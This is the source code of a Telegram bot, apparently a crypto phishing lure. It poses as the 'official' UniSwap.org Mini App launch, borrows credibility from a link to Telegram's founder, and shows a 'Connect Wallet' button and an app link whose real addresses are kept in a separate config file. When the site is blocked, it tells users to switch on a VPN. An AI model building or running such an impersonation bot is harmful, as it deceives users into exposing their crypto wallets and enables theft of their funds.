const { Telegraf, Markup } = require("telegraf");
const axios = require('axios');
const http = require("http");
const path = require("path");
const { token, botApp, chanel, suportt, twitter } = require("./urls.json");

const bot = new Telegraf(token);

bot.start(async (ctx) => {
  const imagePath = path.join(__dirname, "photo_2024-08-24_14-40-26.jpg");
  const response = await axios.get(botApp);
  if (response.status === 200) {
    ctx.replyWithPhoto(
      { source: imagePath },
      {
        caption:
          `👏 Minting a new beginning on [Telegram](https://t.me/durov). We announce the official launch of the Mini App version of UniSwap.org.\n\n` +
          `💡 To open click on the following button.`,
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.url("🦄 Mini App", botApp)],
          [
            Markup.button.callback("Connect Wallet", "connect"),
            Markup.button.url("Twitter", twitter),
          ],
          [
            Markup.button.url("Chanel", chanel),
            Markup.button.url("Suportt", suportt),
          ],
        ]),
      }
    );
  }
  else if (response.status === 403) {
    ctx.reply("⚠️ La página web está bloqueada para tu ubicación. Por favor, utiliza un VPN para acceder.");
  } else {
    ctx.reply("Ocurrió un error al intentar acceder a la aplicación.");
  }
}
);

bot.action("connect", (ctx) => {
  ctx.reply("⏳ In progress...");
});

bot.launch();


const server = http.createServer((req, res) => {
  if (req.method === "GET") {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("Bot is running...");
  } 
});

const port = process.env.PORT || 3000;
server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});